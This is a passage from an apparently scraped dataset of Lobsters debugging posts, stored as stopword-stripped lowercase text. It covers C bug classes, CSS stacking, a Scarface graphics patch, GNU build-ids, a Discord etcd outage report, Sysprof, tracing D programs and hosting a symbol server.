function never return eof even character available exception brings interesting point programmer guarantee calling function never ask zero character boundary need tested indeed definition zerolength buffer bug nt exist complex form bug type mismatch typematch bug occurs programmer attempt pas argument function called function expects argument different type although newer compiler catch lint utility designed look precisely type error typematch bug still seem crop two example double nbr int x sscanf x printf f nbr third line x x fourth line argument type incorrect function argument prototyping newer compiler may catch error library call programmer call function may included argument prototype header file macro bug error inadvertently caused camouflaged macro expansion preprocessor expands macro substitute macro definition anywhere macro name appears body program programmer must aware code actually look like macro expansion macro contains parameter macro even thing consider listing expansion macro cause intent error view fullsize image first expansion nbr incremented twice second macro expands nbr nbr nt perform might expected compiler concludes statement always false optimizes jump instruction intent bug characterized flaw design approach called design bug result incomplete comprehension problem problem complex hard comprehend entire problem sometimes insight needed solve problem come trying program design bug often result simple oversight programmer computer exact human sometimes embarrass u explicit logicin alphabetical sorting function listing test run using uppercase lowercase string function worked flawlessly uppercase string compared lowercase function claimed uppercase string come first regardless character nt expected view fullsize image design bug like local function result interface two function design error span larger scope considered integration bug program terminate abnormally contain execution error bug may detected runtime type check bound check hardwarefault detection mechanism native environment embedded application may simply cause system crash example execution bug division zero running program linktime error incorrectly implemented interrupt assembly code outofbounds array assignment invalid uninitialized pointer simple execution error division zero easy stabilize provided zero direct result controlled test case otherwise hard localize example processor issue interrupt illegal operation attempted interrupt nt expected programmer may set valid vector interrupt vector table case control flow may go weed original cause may readily apparent many execution bug result errant store incorrectly initialized pointer outofbounds array index bug belong nasty class called viral bug extremely hard stabilize localize crop c program unrestricted runtime use pointer array indexing casting effect viral code data usually apparent several million instruction later even infected data might prove catastrophic may cause something else become infected rate bug eventually surface symptom usually nothing original bug ordinarily uninitialized pointer insidious outofbounds array outofbounds array reference usually attack stack frame data area adjacent location array uninitialized pointer attack anywhere often inconsiderate whether attack code data furthermore pointer probably contain different initial value time program run causing entirely different symptom timesubtler bug addition compiletime linktime runtime error bug resulting integration portability compiler error may occur integration bug form huge class programming error error manifest two module combined form program bug may cause error module tested separately may show system becomes integrated one complex program integration function returnvalue typematch bug become apparent function may return error status data processed invalid caller fails check error status may inadvertently continue processing bogus data opposite may also occur function supposed return value may instead contain void return case returned value undefined may appear work initial testing integrated program though creates unexpected bug global variable often cause problem surface integration variable like salt used sparingly lest spoil stew one module change currency global variable cause another module something unexpected later type error require programmer rethink layering program modular level sourcelevel debugger may needed understand interaction occur hack fix real solution might well lie program architecture interrupt present set difficult bug obvious example interrupt bug occurs interrupt neglect save restore entire status machine returning often happens modification made interrupt routine modification us register nt saved interrupt prologue routine foreground program also us register vulnerable interrupt oversight cause previously working code break interrupt routine may call function nt reentrant problem foreground program also us function library routine particularly floatingpoint math library may reentrant one brand compiler another generally interrupt routine require debugger able deal code assembly language level addition debugger must able operate transparently interrupt vice versa multithreaded multitasking system integration bug breed multiply shared resource must either lock semaphore designed reentrant process malloc memory open file must free resource done otherwise system even two three day memory file handle lock program employing setjumplongjump goto statement must carefully designed avoid abnormal control flow may leave resource tied cousin typematch bug portability bug bug surface porting one machine another cause intent execution error since c implemented different way different machine trick work one machine may work another variation size alignment various object particularly difference implementation type float double also cause problem segmented microprocessor may treat pointer differently nonsegmented machine stackaddressing direction byte ordering also different programmer limited experience writing portable c code undoubtedly discover pitfall first time compile old program new machine compiler bug rare occur often bug nt really fault compiler poor coding practice many newer compiler market perform code optimization optimizer may make assumption program nt desired problem complicated fact debugging usually performed unoptimized object debugged program compiled using optimize mode bug show optimizing optimizer probably culpritoptimized code especially globally optimized code tougher debug since object program may match source code line line also sourcelevel debugger wo nt even allow optimized code debugged forcing u retreat assemblylevel debugger support common optimizer bug caused memorymapped io consider io device memorymapped address dataport function listing wait ready status writes sequence character device return new ready status caller view fullsize image optimizer could ball first might consider loop redundant read address replace single read location next might determine nothing body anyway decide entire statement nt even needed would probably assume c assigned address dead store replace single assignment dataport k return might assume last thing written address k still simply return k instead reading status code represented c source look like int sendack extern char dataport dataport k return int k dataport address device optimizers may rearrange code minimize computation safe way avoid optimizer error dealing memorymapped io compile driver optimization turned practice usually safe special situation cause bug optimizing function listing example optimizer might make two assumption ratio xy could done one time hence calculated loop multiply operation array index computation could avoided loop written differently optimizer may produce something equivalent listing view fullsize image view fullsize image function two bug first loop never terminate unsigned character ca nt reach second divide error occur compiler optimizers smart enough detect situation avoid producing code bug suggestion writing better c quickest way debug program write program bug software modular nicely layered usually fewer integration bug suggestion producing code minimum problem extremely careful using pointer uninitializedpointer bug boundary bug time consuming correct look typematch bug using lint utility simply paper debug check function call proper argument return type careful using macro especially containing parameter substitution capitalizing macro name serve reminder macro function call use parenthesis liberally guarantee associativity think portability writing code necessary include header file containing typedefs basic type byte word etc use instead char int program ported another machine compiler modifying typedefs header file use casting converting type nt expect compiler avoid global variable use header file function prototyping argument definition use return code module interface design test exercise branch program include test boundary condition especially code using pointer possible keep test suite future use module ever modified ported another environment writing software complicated tedious puzzle even concerted effort programmer nearly impossible produce nontrivial program bugfree first time knowing potential cause bug allows u adopt discipline minimize occurrence guide effort stabilize localize correct robin knoke cofounded applied microsystems corp article written involved specification design productivity tool creating debugging embedded system software left amc running white salmon group inc small productdevelopment company small like way say white salmon group wwwwhitesalmongroupcom design embedded microprocessor several knoke still lot c coding reach continue reading
88,Lobsters,debugging,Debugging,"When debugging, your attitude matters",https://jvns.ca/blog/debugging-attitude-matters/,debugging attitude matter,debugging program look like attitude problem attitude hard understand reproduced differentinfirefoxandchrome thing fact small example zindex problem look like though think specific bug extra complication mdn page stacking order better attitude let learn basic see help rule creates new stacking context watching people know inspiring documentation mdn documentation trust make big difference cs trick centering cs complete guide,back wrote debugging program look like debugging change one thing time check assumption debugging cs last week think post missing something important attitude good cs developer yet never written cs professionally understand lot basic cs concept think finally understood first time recently position absolute work last week working complicated cs project ever attempted debugging cs noticed bad thing normally would making random change code hope would work googling lot thing trying without understanding something broke reverting change starting strategy exactly effective might imagine effective attitude cs unusualforme belief cs hard impossible understand let talk attitude bit problem attitude hard understand one specific problem divs stacked top one another wanted div top div b model cs stacking order start basically want thing top thing b change zindex make work changed zindex div something work firefox div top chrome div b top argh cs impossible want see exact actual situation reproduced differentinfirefoxandchrome thing fact googled bit found possible reason zindex might work div div b actually different stacking context true even set zindex div would still put top div b small example zindex problem look like though think specific bug extra complication thought man stacking context thing seems really complicated different firefox chrome going able figure tried bunch random thing bunch blog post suggested usual work finally gave change random thing pray strategy thought well read documentation stacking order maybe bad read mdn page stacking order say zindex property specified element element stacked following order bottom top background border root element descendant nonpositioned block order appearance html descendant positioned element order appearance html simple depends order html put div div b html sibling made everything work browser better attitude let learn basic see help whole stacking problem turned really complicated needed read short simple documentation page understand stacking work course computer thing always simple even specific case rule creates new stacking context pretty complicated need understand complicated rule order put div top div b needed know much simpler rule calm second learn basic see help watching people know inspiring another area cs thought hard understand whole position absolute position relative business kept seeing sometimes using example people made complicated cs thing position absolute understand worked position absolute mean element always place screen position absolute thing moving scroll like rest document spoiler position fixed last week paired someone lot better cs code saw typing position absolute position relative confidently code without seeming confused could looked documentation mdn position absolute said element removed normal document flow space created element page layout positioned relative closest positioned final position determined value top right bottom left thing position absolute positioned relative closest positioned ancestor use topbottomrightleft pick simple documentation trust make big difference think another big source frustration cs best grasp find accurate information advice knew mdn reliable reference mdn really help answer question like ok seriously center div found reading lot random stack overflow answersblog post sure correct week learned cs trick lot great article like centering cs complete guide seems reputable written super clear way really know started believe impossible understand basic cs concept since believe computer general maybe writing cs beginner level long time ever really tried involved cs project let arrange divs grid flexbox attitude really got way writing cs wanted write let go used normal debugging technique able get lot thing work way wanted
89,Lobsters,debugging,Debugging,How many warnings should your JavaScript app have?,https://gist.github.com/laurent22/bbe965c3321f4d49a605e95219b37661,many warning javascript app,many warning javascript app warning warning warning warning warning reload reload,instantly share code note snippet many warning javascript app many warning javascript app javascript warning message displayed yellow red javascript console terminal make sense general good indication health app point give general idea many warning expect app warning app working warning app probably starting crashing soon try find crash think could read warning learn nt work warning warning soft spot likely everything running smoothly warning might indication problem could package developer decided print page warning something thought important everything still work developer moved important stuff get used see warning time warning need something app still work fine course amount warning printed starting slow everything usually make sense throw away whole app start new one new apps le warning fun work anyway example well working app test passing flying colour perform action time signed another tab window reload refresh session signed another tab window reload refresh session
90,Lobsters,debugging,Debugging,SilentPatch for Scarface: The World is Yours & launching a Patreon campaign,https://cookieplmonster.github.io/2020/03/29/silentpatch-scarface/,silentpatch scarface world launching patreon campaign,download patreon introduction scarface world pcgamingwiki page every exactly part one critical bug directx wrapper vertex index buffer entire buffer discarded entirely always work proving correctness part two performance seen already performance aap really silentpatch scarface changelog download stick bit longer download silentpatch scarface announcing patreon new way support launched several new release people become patron see source github,tl dr interested indepth overview wrong game fixed scroll download section link patreon announcement introduction today subject scarface world tiein game movie scarface developed radical entertainment released late naturally likely know going wrong time always pcgamingwiki page provides answer time writing post see issue listed one key point graphic corrupted modern version window tell much bad look like bad result vary across different pc greatly nearly every modern pc display broken mess rendering game unplayable course community came workarounds sadly drawback dgvoodoo used game seems fix issue however dgvoodoo wrap game might bump system requirement considerably considering complex also hard prove absolutely everything render flawlessly curiously issue also go away game run pix graphic debugger however similar issue apply given pix used collect data might introduce additional overhead also always run game bit clunky might suffice casual play neither workarounds address root cause issue however want know exactly went wrong enough armed debugger virtual machine proceed figuring issue part one critical bug step one figuring issue course attaching debugger time since issue seems specific aided directx wrapper elisha riedlinger minimal wrapper excellent prototyping since allows instantly reliably tap game rendering code without game specific hacking said issue could really anything experience help able come theory observing bug look visually game moving around make shape move possibly corresponding player character animation mean least part garbage fact tony model result vary every session machine might even look different example seen variation environment corrupted people tposing theoretized issue relates vertex buffer updating properly point worth mention people thought issue show multicore cpu true could mean issue classic race condition also would explain look different every time conceptually also make sense game could loading model multiple thread setting resource concurrently imagine failing thread safe manner could result artifact looking like theory trivial confirm debunk via wrapper set additional code verify call lock unlock done thread done multiple thread could possible culprit set verification nothing ツ theory debunked let take another look vertex buffer lock though spotted lock done flag looking msdn doc defined emphasis added application discard memory within locked region vertex index buffer entire buffer discarded option valid resource created dynamic usage know see possible room error possible lock part buffer imagine somebody realizing locking part buffer discard flag would throw away entirely however game always lock entire buffer lock else lock analyzing code though fully convinced discarding game always fill entire buffer assume flag added wrongly remove work seem fluke either game consistently fixed several people tested cautious reader might stop right ask question clearly game worked asis point know another workaround break using pix dgvoodoo fix proving correctness wrapper knowledge supposed used could come proof flag used wrongly principle use flag locking buffer care buffer past content intended fill new data game used flag also expected buffer retain old content flag misused test whether game really care previous buffer content deliberately filled garbage game locked hresult hr proxyinterface lock offsettolock sizetolock ppbdata flag succeeded hr flag memset ppbdata mbuffersize return hr much relief result le expected graphic broken prof game lock buffer flag expects content thrown away satisfactory enough proof api misuse proof removing flag workaround correct fix pix dgvoodoo latter wrapper imagine emulating behaviour discard flag pix hand graphic debugger order able capture frame likely preserve past current buffer content prove certain surprised pix ignored flag overall done part two performance could technically finish important issue fixed game playable however something still gtx mind pc nowhere close bad yet unable maintain stable fps area presented screenshot fact got consistent fps say terrible would understatement however looking process affinity task manager reveals interesting like every game launch looking game code seems like game voluntarily set run one core know sure theoretized might workaround aforementioned graphic corruption bug recall people claimed bug occurs multicore cpu theoretized perhaps winxp day limiting cpu affinity one core fixed issue newer system stopped case due change driver work eg wddm driver manage buffer process affinity setting would affect long shot hey seen already remove code game run core sure enough smooth butter also seem visible race condition could hidden setting cpu affinity people tested hour encountered crash new bug talking top also identified game creating device multithreaded flag said degrade performance absolutely unneeded game another performance gain performance turn yes testing fix aap observed game ran really poorly pc technically full speed driving around hitch lot also observed debugging game virtual machine sometimes game pause second time checked debugger much surprise hitch game spent lot releasing buffer fired pix immediately noticed happy game create new buffer thus unload old buffer driving around load really unhealthy reason game reuse buffer instead throwing away creating new one luckily game two type vertex buffer static buffer managed pool dynamic buffer default pool one type index buffer make buffer cache relatively simple implement look like game might really need settled implementing simplistic cache following behaviour creating buffer try find buffer matching type size exist check bigger buffer matching type however prevent unnecessary hogging resource test buffer twice big requested found create new buffer implemented cache ran test really smooth comparison aap pix graph also looked much much better reuse fix implemented finally satisfied state game final touch silentpatch scarface good go changelog download aside exciting fix presented also implemented boring change full changelog follows gamebreaking graphical corruption fixed making game playable modern multicore machine allowed game use cpu core instead locking one core dramatically improving performance removed unneeded multithreaded flag device possibly improving performance slightly introduced cache resource used game dramatically reducing amount stutter roaming around city made game list selectable resolution instead cherry picked list moved game setting registry settingsini game directory resolve possible issue saving setting head mod patch via button download silentpatch scarface stick bit longer download silentpatch scarface upon downloading need extract archive game directory asked whether overwrite file select yes announcing patreon new way support past month launched several new release tried fairly active emulation scene became increasingly productive time people wished see new way support work since github sponsor although nice much friction people start using mind together release sp scarface starting patreon campaign fear paid early release happening perk include place credit every release access personal todo list ability commentsuggest much depending response might end modifying reward bit become patron thank interested full source code patch published github freely used point reference see source github
91,Lobsters,debugging,Debugging,Read your own .note.gnu.build-id,https://github.com/mattst88/build-id,read notegnubuildid,buildid background elf binutils mesa others similar question problem mesa solution api usage find section given filename elf binary find section given symbol elf binary return length byte buildid return pointer buildid example testc sotestc dlopentestc building caveat testing caveat fpic buildid dependent compiler flag proposed failed solution gold,buildid read notegnubuildid background notegnubuildid section elf binary contains strongly unique embedded identifier binutils ld supported buildid option since version released used argument directs ld insert elf section notegnubuildid binary containing hash normative part identifier uniquely identifies output file originally intended purpose described simplify improve debugging tool occasionally useful program able read buildid mesa us buildid running opengl vulkan driver way identifying ondisk cache precompiled shader program spent good amount time researching possible way uniquely identifying running opengl vulkan driver saw others similar question problem mesa software project providing opengl vulkan linux need identify ondisk cache compiled shader program shader program compiled one version mesa may work worse cause gpu hang another version know whether running version mesa generated cached file found buildid flag struggled find way access identifier generates within running process solution dliteratephdr function critical piece puzzle allowing application inspect shared object loaded callback function search program header object loaded find appropriate notegnubuildid section mesa buildid included data hashed provide key look shader ondisk cache ensures mesa load shader program produced identical build problem solved code successful use mesa since hope make technique widely known save others time code small mit licensed feel free include two source file project api usage retrieve opaque pointer notegnubuildid elf segment process address space using either filename loaded elf binary symbol address returned pointer access buildid length byte api consists four function opaque struct data type find notegnubuildid section given filename elf binary const struct buildidnote buildidfindnhdrbyname const char name return null failure find notegnubuildid section given symbol elf binary const struct buildidnote buildidfindnhdrbysymbol const void symbol return null failure return length byte buildid elfw word buildidlength const struct buildidnote note return pointer buildid const buildiddata const struct buildidnote note example demonstration api provided testc retrieves buildid sotestc retrieves buildid linked shared object dlopentestc retrieves buildid dlopen shared object buildid build id ldlibrarypath sobuildid build id dlopenbuildid build id separately file command retrieve buildids file buildid buildid elf lsb pie executable version sysv dynamically linked interpreter buildid gnulinux debuginfo stripped file libbuildidso libbuildidso elf lsb shared object version sysv dynamically linked buildid stripped building simple makefile build example program wl fpic see caveat testing make check run example program verifies output buildid reported file caveat fpic looking buildid given symbol name buildidfindnhdrbysymbol requires call dladdr function quoting dladdr man page sometimes function pointer pas dladdr may surprise architecture notably dlifname dlifbase may end pointing back object called dladdr even function used argument come dynamically linked library problem function pointer still resolved compile time merely point plt procedure linkage table section original object dispatch call asking dynamic linker resolve symbol work around try compile code positionindependent compiler prepare pointer compile time gcc generate code load final symbol address got global offset table run time passing dladdr result build code fpic ensure buildidfindnhdrbysymbol work expected practice found compiling sobuildid program without fpic clang caused program fail buildid dependent compiler flag change affect code data elf binary also result different buildid obvious important note debug release build different buildids mesa usage entirely acceptable expect vast majority user using distributionprovided build mesa proposed failed solution proposed solution tried failed variety reason hash source code use linker script insert startend symbol around notegnubuildid failed reading buildid shared object unknown reason incompatible gold use linker script use dladdr find path name binary open read elf section effectively code repository without guarantee binary read disk one executing current process
92,Lobsters,debugging,Debugging,Discord Incident Report (March 16 Outage),https://status.discordapp.com/incidents/62gt9cgjwdgf,discord incident report march outage,summary timeline http http investigation analysis http githubcometcdioetcd action item response,time pdt summary discord unavailable user period hour root cause well understood fixed bug service discovery system used service within infrastructure discover one another instance service discovery used real time chat service service order discover rpc endpoint use load data database connect discord discord server guild created first time need reloaded database timeline set node serve api traffic scale deal growing load api cluster event happens throughout day single node called scaled unexpected error announcing service discovery elixir service used handle real time connection chat message processing started crash resulting instantaneous loss capacity causing cascading failure dependent system multiple alarm internally go signal drop key metric look well anomaly alert cluster utilization incident declared phone bridge set available engineer hop start investigating establish internal external communication status page incident opened let user know investigating http tweet posted letting user know looking issue check status page update http engineer investigate exactly lost much capacity real time system engineer focus recovering service restarting lost capacity begin throttle connection discord order help service recovery additionally begin stop database maintenance operation antientropy repair two scylladb cluster would lead resource starvation everyone attempting reconnect engineer pinpoint issue strongly correlated spike error originating service discovery module determined service discovery process api service gotten crash loop due unexpected deserialization error triggered event called max restart intensity process supervisor determined crashing frequently decided trigger full restart node event occurred instantaneously across approximately node watching api node across multiple cluster believed related u hitting cap number watcher etcd keyvalue store use service discovery attempt increase using runtime configuration engineer continue remediate failed node restore service user connection throttle continually increased allowing user reconnect service recover status page incident resolved service deemed fully operational mitigation issue deployed production order prevent issue recurring root cause fully understood investigation analysis root cause outage determined invalid service entry inserted service discovery causing parse error trying deserialize entry loading etcd engineer worked recreate issue test environment able reproduce issue observed production development environment discord us open source distributed reliable keyvalue store called etcd http githubcometcdioetcd order store service discovery information service discoverable announce setting key specific directory etcd pertains cluster part key second ttl service responsible heartbeating etcd reannounce key discord using etcd api node joined api cluster introduced google cloud managed instance group autoscaler normal event happens hundred time day utilization platform increase approach peak hour node logged error attempting initially announce etcd httpclientremotedisconnected remote end closed connection without response nearly immediately almost elixir node logged service watcher discordapi service crashed attempting parse json metadata stored key value etcd process crashlooped briefly due invalid json data etcd cluster lasted api node retried announcing service discovery fixing corrupt key written etcd node announce etcd issuing http put request contains urlencoded form body contains value key case value json encoded metadata information relevant discovery service etcd client us python builtin http client sends put request along contentlength header one packet request body another packet determined connection reset sending first packet second packet could sent wellbehaved http server would see received request specifying contentlength incomplete nonexistent body reject request etcd written go programming language us go standard library nethttp http request handler key api order parse form body sent client us nethttprequestparseform method method check see request body length match length specified contentlength header caused key written empty string value announce request able successfully send header send body turn caused invalid key written service discovery caused downstream service crash key rewritten announcing node retried action item response code within service discovery system resilient type failure within expectation key could announced without value due transient network error service discovery system resilient various failure mode within etcd however anticipate client able write corrupt record due improper http handling golang nethttp module violation http specification specific case introduced additional failure case anticipate expected contentlength header incomplete body rejected server incomplete unfortunately nethttp check byte read body portion request match contentlength header since hardened system reduce likelihood occurring also handle invalid service announced without crash looping order reduce likelihood invalid key written service discovery modified etcd client send announce request single tcp packet instead two mean header body either received completely added additional error handling ignore service corrupt key value case issue recur worst happen service discovered able investigate additionally filling upstream bug report go project aware issue hopefully nobody else learn hard way sorry inconvenience caused working around clock make sure discord reliable available everyone especially utilization platform time high thank choosing discord place hang talk friend
93,Lobsters,debugging,Debugging,How to use Sysprof to…,https://blogs.gnome.org/chergert/2020/03/14/how-to-use-sysprof-to/,use sysprof,finding code run often system tracking extraneous allocation finding main loop slow down,first using sysprof improve performance particular piece software make sure compiling flag allow u enough information unwind stack frame sysprof use libunwind case majority stack unwinding done linux kernel currently follow ehframe exception handling information configjhbuildrc following osenviron cflags ggdb fnoomitframepointer osenviron gslice alwaysmalloc generally disable gslice allocator really helpful modern linux system using glibc also make difficult track leak furthermore get way releasing memory back system form malloctrim start future hint like finding code run often system sysprof core whole system profiler mean designed profile single program instead process system useful desktop scenario lot interconnected component ensure callgraph aid selected click record point excercise system try bring behavior want optimize click stop stop recording view result presented callgraph like following completed recording loaded information notice lot time gnomesoftware turn alpha install behavior change libcurl screwed number previously valid use case know already would point start looking notice compiled libcurl gnomesoftware source stack trace detailed would otherwise right side callgraph starting everything split process callstack see program topleft side list function collected decoded bottomleft side list caller selected function useful want backtrack place function called note samplingbased profiler guarantee function intercepted use information find relevant code within particular project tweak thing try tracking extraneous allocation one thing slow application memory allocation hot path allocating memory still pretty expensive compared thing application could sysprof gained support tracking memory allocation ldpreload however must spawn application directly start toggling launch application set argument application want profile select track allocation point run application exercise targeted behavior press stop presented recording usually normal callgraph selected default select memory allocation row see memory callgraph time see memory allocation size next function explore bit look thing seem place following image notice lot transforms allocated quick discussion benjamin landed small patch make go away sometimes even write code variant patch went mutter copy clutter healthy memory improvement finding main loop slow down sysprof master speedtrack aid help find various long running operation fsync used late cycle fix bunch io happening gnome shell compositor thread select speedtrack aid disable callgraph clash speedtrack currently also us ldpreload spawn application like memory tracking aid give callgraphs various thing happened main thread might want avoid stuff like fsync read also creates mark duration call track long ran deep pango various file loaded demand mean expensive read main loop operation also see long operation taken see gmaincontextiteration took millisecond system good either missed frame took long something able submit frame time select time range activating row future want play better callgraphs see sampled timespan anyway hope give insight use thing
94,Lobsters,debugging,Debugging,Tracing D Applications,https://dlang.org/blog/2020/03/13/tracing-d-applications/,tracing application,http based approach standard library tracingwritefd pro except betterc mode package con profile performance memory consumption debuggerbased approach process debugged code tracinggdbd separate file called tracegdb convenience variable pro watchpoints catchpoints con see gdb manual vladimir panteleev dmdprof usdtbased approach open source licensed gpl using bpftrace linux ebpf usdt library code tracingusdtd mixed called bpftracebt pro con conclusion prettyprinting feature pretty printing lowlevel clean code recompilation restart usage complexity thirdparty tool cross platform overhead production ready,one time another application development need make decision application work like wrong different technique help decide logging tracing profiling different one way look like know exactly event interested make decision use logging know exactly event need make decision forced collect many event use tracing need collect event analyze derive new information use profiling article focus tracing developing application use tracing monitor characteristic run time example estimate performance memory consumption several option mean provided programming language example using writef aka printf debugging debugger using script remote tracing osspecific tracing framework linux ku probe usdt probe linux kernel event performance event window etc article following contrived example used help illustrate three case focusing linux example code article found github repository http foreach counter totalcycles randomly generate one three kind event event event cast event uniform perform job benchmark cpu execution time switch event case eventone dosomework break case eventtwo dosomework break case eventthree dosomework break default assert dosomework simulates cpuintensive job using druntime threadsleep method common pattern application run cycle every iteration performs job depending application state see application three code path caseone casetwo casethree need trace application run time collect information timing writefbased approach using writefln phobos standard library trace application naive useful nevertheless code tracingwritefd case eventone auto sw stopwatch autostartno swstart dosomework swstop writefln tevent took counter event swpeek break trivial approach stopwatch standard library used measure execution time code block interest compile run application command dub tracingwritefd look output running examplewritef event one took m μs hnsecs event one took m μs hnsecs event two took sec m μs hnsecs event two took m μs hnsecs price need compile tracing code binary need manually implement collection tracing output disable need mean size binary increase summarize pro might phobos available employ except betterc mode tracing output displayed human readable format look nice output duration thanks jonathan davis stddatetime package source code portable easy use thirdparty tool required con application must rebuilt restarted order make change inappropriate application server lowlevel access application state noise code due addition tracing code unusable due lot debug output overhead large hard use production approach suitable early stage development le useful final product although tracing logic fixed well defined approach used productionready applicationslibraries example approach suggest stefan koch tracing dmd frontend profile performance memory consumption debuggerbased approach debugger case gdb advanced mean trace application need modify application change tracing methodology making useful production instead compiling tracing logic application breakpoints set debugger stop execution breakpoint developer use large arsenal gdb functionality inspect internal state inferior gdb term usually refers process debugged possible case use phobos directly helper available moreover access register unavailable case writef debugging let take look code tracinggdbd first event case caseone dosomework break see tracing code much cleaner tracing logic placed separate file called tracegdb consists series command block configured execute specific breakpoints like set pagination set print address break command set eventone currclock continue end break command set eventone currclock eventone printf tevent one took sn counter printclock eventone continue end run quit first line pagination switched enables scrolling need press enter q continue script execution current console fill second line disables showing address current breakpoint order make output le verbose breakpoints set line followed list command command end label executed gdb stop breakpoints breakpoint line configured fetch current timestamp using helper dosomework called one line get current timestamp dosomework executed fact line empty line source code gdb smart enough set breakpoint next available line eventone convenience variable store timestamps calculate code execution time currclock printclock long helper let u prettify formatting mean phobos last two command script initiate debugging quit debugger finished build run tracing session use following command dub build tracinggdbd single gdb commandtracegdb tracinggdb grep event tracegdb name gdb script tracinggdb name binary use grep make gdb output look like writefln output easier comparison pro code clean contains tracing code need recompile application change tracing many case enough simply change gdb script need restart application used production sort overhead ifwhen tracing little tracing watchpoints catchpoints used instead breakpoints con using breakpoints case may inconvenient annoying impossible gdb prettyprinting provides le pretty output lack full phobos support compared writef approach sometimes gdb available production point setting breakpoints gdb inconvenient based fact use address line number function name see gdb manual using address low level inconvenient line number ephemeral easily change source file edited script broken annoying using function name convenient stable useless need place tracing probe inside function good example using gdb tracing vladimir panteleev dmdprof usdtbased approach far two way trace application complimentary way unify advantage two approach avoid drawback course answer yes fact several way achieve hereafter one discussed usdt userland statically defined tracing unfortunately due historical reason linux tracing ecosystem fragmented rather confusing plain simple introduction get ready invest much time want understand domain first wellknown fullfledged tracing framework dtrace developed sun microsystems open source licensed gpl yes strace ltrace around long time limited eg let trace happens inside function call today dtrace available solaris freebsd macos oracle linux dtrace available linux distribution initially licensed cddl relicensed gpl linux tracing ecosystem everything open source disadvantage case resulted fragmentation several toolsframeworksetc able solve problem different way somehow sometimes interoperate using bpftrace high level tracing language linux ebpf usdt probe provided usdt library let start code tracingusdtd case caseone mixin usdtprobe dlang caseone kind dosomework mixin usdtprobe dlang caseonereturn kind break mixed two probe start end code interest look similar first example using writef huge difference logic defined two probe nop instruction mean probe almost zero overhead use production second great advantage change logic application running impossible using writef approach since using bpftrace need write script called bpftracebt define action performed probe usdt tracingusdt dlang caseone last caseone nsecs usdt tracingusdt dlang caseonereturn last caseone tmp nsecs period tmp last caseone printf tevent caseone took msn counter period last caseone tmp timing hist period first statement action block trigger usdt probe compiled tracingusdt executable includes path executable dlang provider name caseone probe name probe hit global indicated sign associative array last update current timestamp element caseone store time moment code start running second action block defines action performed caseonereturn probe hit first check corresponding element last associative array already initialized needed application may already running script executed case caseonereturn probe fired caseone calculate much time code execution took output store histogram called timing begin end block top bpftracebt define action performed beginning end script execution nothing initialization finalization build run example dub build tracingusdtd single gdc tracingusdt run example background sudo bpftrace bpftracebt start tracing session output attaching probe event casethree took m event casethree took m event casetwo took m event caseone took m event caseone took m event casethree took m event casetwo took m event casethree took m event caseone took m event casetwo took m event caseone took m event casethree took m event caseone took m event casethree took m event casetwo took m event caseone took m event casetwo took m event casetwo took m c timing session output line instead tracingusdt started bpftrace script first two event lost also necessary kill example typing ctrlc tracingusdt completes bpftrace script stop execution ouputs content timing map histogram histogram say onetime code execution take m ten time m seven time m builtin statistic make using bpftrace easy pro provides lowlevel access code register memory etc minimal noise code need recompile restart changing tracing logic almost zero overhead effectively used production con learning usdt hard particularly considering state linux tracing ecosystem requires external tool frontends o specific note gdb support usdt probe since version use modify tracegdb script set breakpoints using usdt probe instead line number eas development eliminates need synchronize line number source code modification futher reading conclusion feature writef gdb usdt pretty printing mean phobos libs mean prettyprinting limited builtins lowlevel yes yes clean code yes sort recompilation yes restart yes usage complexity easy easy advanced thirdparty tool debugger tracing system front end cross platform yes sorta o specific overhead large none ignored even production production ready sometimes possible sometimes impossible yes feature description pretty printing important tracing output read human ignored case intermachine data exchange lowlevel mean access lowlevel detail traced binary eg register memory clean code characterizes whether additional tracing code unrelated application business logic would required recompilation determines necessary recompile changing tracing methodology restart determines necessary restart application changing tracing methodology usage complexity indicates level development experience may required utilize technology thirdparty tool describes tool provided standard language distribution required use technology cross platform indicates technology used different platform without change overhead cost using technology production ready indicates technology may used production system without consequence
95,Lobsters,debugging,Debugging,"Creating a Public Symbol Server, Easily",https://randomascii.wordpress.com/2020/03/14/creating-a-public-symbol-server-easily/,creating public symbol server easily,big fan symbol server year microsoft chrome sourceindexed seven simple step free trial storage bucket choosing name found answer shown symbol microsoft way chromedllpdb broke gib existing public symbol server http symbolsmozillaorg coda updated uiforetw packaging script uiforetw http randomasciisymbolscommondatastoragegoogleapiscom sign google storage create storage bucket make symbol worldreadable install gsutil gsutil config use symstoreexe create local symbol server directory structure like brucedawson,big fan symbol server year part microsoftwindows ecosystem far better anything seen operating system microsoft chrome symbol server configured download user chrome crash start analyzing immediately code byte symbol without knowing caring o chrome version user running since chrome symbol sourceindexed even get sourcecode popping automatically available anyone interested special google privilege required symbol server magical wonderful yet never set publicly visible one landed fix symbol server last two job never created one scratch make symbol tool sample available since quarantined varying degree home kirkland spending sunny saturday setting symbol server documenting process really easy symbol server basically file http server content arranged specific way lot way set server decided use one familiar one used chrome symbol server google storage work google obvious bias obvious make seven simple step first step create google cloud account free trial give credit first year publishing symbol world cost anything plugged number cost estimator show go create bucket hard see could end costing much cup coffee year class b operation downloads enough anyone next step create storage bucket challenging part choosing name bucket name globally unique grab favorite chose randomasciisymbols glad still like blog name changed access control uniform probably necessary otherwise took default setting entirely obvious make symbol worldreadable bit searching found answer bucket go permission click add member set new member field allusers role storage object viewer needed get gsutilpy set could commandline upload file already gsutil installed part chromium depottools run gsutilpy config set credential next step get symbol pdb file pe file actually symbol server format simplest way create empty directory use symstoreexe add file shown note original symbol microsoft way post pe file name lowercased uploading casesensitive symbol server well google storage case sensitive testing show case pe file preserved know differently test pefile downloading carefully perhaps using retrievesymbols windbg sym noisy already uiforetw symbol format run command local symbol server directory python c srcdepottoolsgsutilpy cp z r g randomasciisymbols r say copy recursively z say upload file gzip compression also use compress option symstore got burned chromedllpdb broke gib prefer let gsutil compression either way work existing public symbol server seems like good place put list publicly available symbol server note symbol server host pe file dlls ex may seem odd metadata pe file essential stackwalking process since company like nvidia amd release pdbs thankful least release pe file case usual way specify ntsymbolpath windbg srv c symbol http symbolsmozillaorg entry semicolon separated list visual studio tool usually place paste directly list coda updated uiforetw packaging script future release published uiforetw symbol last three release symbol server new symbol server path usable debugging profiling uiforetw future blog post http randomasciisymbolscommondatastoragegoogleapiscom caveat use symbol server trust one trust short step sign google storage create storage bucket maybe make access control uniform make symbol worldreadable install gsutil already run gsutil config get commandline access project use symstoreexe create local symbol server directory structure use gsutilpy z r upload local symbol server folk like like loading related brucedawson programmer working google focusing optimization reliability nothing fun making code run fast unless eliminating large number bug also unicycle play ice hockey sled hockey juggle worry whether blog called review tell http
